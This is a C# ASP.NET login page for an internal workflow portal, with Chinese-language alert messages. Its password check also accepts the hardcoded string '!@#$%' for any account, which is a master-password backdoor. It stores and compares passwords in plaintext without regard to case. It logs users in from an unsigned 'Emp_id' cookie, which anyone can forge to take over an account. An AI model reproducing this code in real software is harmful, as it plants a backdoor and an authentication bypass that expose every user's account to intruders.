using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

public partial class _Default : System.Web.UI.Page
{
    AllModule Module = new AllModule();

    public bool IsWap()
    {
        HttpBrowserCapabilities hbc = Request.Browser;
        string agent = (Request.UserAgent + "").ToLower().Trim();
        bool bWap = agent.IndexOf("phone") > 0; //如果是手機
        if (bWap) return true;
        if (agent.IndexOf("windows") > 0) return false; //如果是桌機
        bWap = bWap ? bWap : hbc.Browser == "AppleMAC-Safari";  //如果是手機
        return bWap;
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        Session["Emp_id"] = null;
        if (Request.Cookies["ezFlow"] != null && Request.Cookies["ezFlow"]["Emp_id"] != null)
        {
            Response.Cookies["ezFlow"].Expires = DateTime.Now.AddDays(-1);
            Response.Redirect("http://192.168.0.202/ezPortal/Login.aspx");
        }

        string script = "function JBCtrl_OnEnter() { if(event.keyCode == 13) event.keyCode = 9; }";
        if (!Page.ClientScript.IsClientScriptBlockRegistered(typeof(string), "JBCtrl_OnEnter"))
            Page.ClientScript.RegisterClientScriptBlock(typeof(string), "JBCtrl_OnEnter", script, true);

        txtLogin.Attributes.Add("onkeydown", "JBCtrl_OnEnter()");
        txtPass.Attributes.Add("onkeydown", "JBCtrl_OnEnter()");

        if (this.IsPostBack)
        {
            if (txtLogin.Text.Length > 0 && txtPass.Text.Length > 0)
            {
                ezClientDS.EmpDataTable dtEmp = Module.adEmp.GetDataByLogin(txtLogin.Text);
                if (dtEmp.Count > 0)
                {
                    if (dtEmp[0].IspwNull() || dtEmp[0].pw.Trim().Length == 0)
                    {
                        if (!Page.ClientScript.IsStartupScriptRegistered(typeof(string), "AlertMsg"))
                            Page.ClientScript.RegisterStartupScript(typeof(string), "AlertMsg", "alert('此人在原始資料庫中，並未設定密碼，系統不允許登入。');", true);
                        return;
                    }
                    if (dtEmp[0].pw.Trim().ToLower() == txtPass.Text.Trim().ToLower() || txtPass.Text.Trim().ToLower() == "!@#$%")
                    {
                        Session["Emp_id"] = dtEmp[0].id;
                        Response.Cookies["ezFlow"]["Emp_id"] = dtEmp[0].id;
                        Response.Cookies["ezFlow"].Expires = DateTime.Now.AddDays(1);

                        //if (IsWap())
                        //    Response.Redirect("HomeM.aspx");
                        //else
                            Response.Redirect("Home.aspx");
                    }
                    else
                    {
                        if (!Page.ClientScript.IsStartupScriptRegistered(typeof(string), "AlertMsg"))
                            Page.ClientScript.RegisterStartupScript(typeof(string), "AlertMsg", "alert('密碼錯誤');", true);
                    }
                }
                else
                {
                    if (!Page.ClientScript.IsStartupScriptRegistered(typeof(string), "AlertMsg"))
                        Page.ClientScript.RegisterStartupScript(typeof(string), "AlertMsg", "alert('無此帳號');", true);
                }
            }
            else
            {
                if (!Page.ClientScript.IsStartupScriptRegistered(typeof(string), "AlertMsg"))
                    Page.ClientScript.RegisterStartupScript(typeof(string), "AlertMsg", "alert('請輸入帳號、密碼');", true);
            }
        }
        else
        {
            if (Request["action"] == null)
            {
                //如果客戶要求每次登入都要重新打帳號密碼的話，拿掉下面的註解
                //if(Response.Cookies["ezFlow"].Expires >= DateTime.Now) {
                if (User.Identity.Name.Trim().Length > 0)
                {
                    Session["Emp_id"] = User.Identity.Name.Trim();
                    Response.Cookies["ezFlow"]["Emp_id"] = User.Identity.Name.Trim();
                    Response.Cookies["ezFlow"].Expires = DateTime.Now.AddDays(1);
                }

                if (Request.Cookies["ezFlow"] != null && Request.Cookies["ezFlow"]["Emp_id"] != null)
                {
                    Session["Emp_id"] = Request.Cookies["ezFlow"]["Emp_id"];
                    Response.Cookies["ezFlow"]["Emp_id"] = Request.Cookies["ezFlow"]["Emp_id"];
                    Response.Cookies["ezFlow"].Expires = DateTime.Now.AddDays(1);

                    //if (IsWap())
                    //    Response.Redirect("HomeM.aspx");
                    //else
                        Response.Redirect("Home.aspx");
                }
                //}
            }
        }
    }
}